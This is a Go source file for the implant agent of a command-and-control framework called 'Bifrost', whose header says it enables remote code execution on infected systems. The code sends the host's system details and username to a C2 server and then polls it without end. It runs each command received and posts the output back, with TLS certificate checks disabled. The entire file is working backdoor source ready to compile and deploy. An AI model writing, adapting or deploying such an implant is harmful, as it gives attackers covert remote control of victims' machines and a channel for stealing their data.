/*
Agent for Bifrost. Allows for remote code execution on infected systems using
secure TLS encryption over the HTTPS protocol.

Usage:

  ./agent

When agent receives commands it executes them on the system and then sends
the result back to the Bifrost server.
*/

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/host"
)

// compile time variables
var (
	IP        = "127.0.0.1"
	SleepTime = "10"
)

// info to send back to the Bifrost server
type system_info struct {
	Stats     *host.InfoStat
	IP        string
	USERNAME  string
	SleepTime string
}

// Registers a agent to the Bifrost server, sending it the collected
// system info and receiving back an agent id which it will use to
// poll the server for commands.
func register(serverIP string) string {
	// Gather system info
	stats, _ := host.Info()
	user, _ := user.Current()
	// get ip
	ip := GetLocalIP()
	// set info in the requests json
	host_info := system_info{
		stats,
		ip,
		user.Name,
		SleepTime,
	}
	postBody, _ := json.Marshal(host_info)
	responseBody := bytes.NewBuffer(postBody)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp_register, _ := http.Post("https://"+serverIP+"/api/1.1/register_agent", "application/json", responseBody)
	resp_register.Close = true
	body2, _ := ioutil.ReadAll(resp_register.Body)
	agent_id := string(body2)
	return agent_id
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// Polls the server for commands and executes them, sending back the result.
func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
	post_body, _ := json.Marshal(map[string]string{
		"id": agent_id,
	})
	postBody := bytes.NewBuffer(post_body)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp_query, _ := http.Post("https://"+serverIP+"/api/1.1/get_command", "application/json", postBody)
	resp_query.Close = true
	resp, _ := ioutil.ReadAll(resp_query.Body)
	out := string(resp)
	tokens := strings.Split(out, ",")
	command := tokens[0]
	if command == "None" {
		time.Sleep(sleepTime * time.Second)
	} else {
		command_id := tokens[1]
		args := strings.Split(command, " ")
		parsed_command := args[0]
		args = args[1:]
		out, _ := exec.Command(parsed_command, args...).Output()
		output := string(out[:])
		resp_body, err := json.Marshal(map[string]string{
			"agent_id":   agent_id,
			"command_id": command_id,
			"output":     output,
		})
		if err != nil {
			fmt.Println("Failed to marshall the json")
		}
		responseBody := bytes.NewBuffer(resp_body)
		http.Post("https://"+serverIP+"/api/1.1/command_out", "application/json", responseBody)
	}
}

// Main loop that runs indefinitely, sending and receiving commands
// from the Bifrost C2 server.
func main() {
	agent_id := register(IP)
	SleepTime, _ := strconv.Atoi(SleepTime)
	time_dur := time.Duration(SleepTime)
	for {
		get_command(agent_id, IP, time_dur)
	}
}
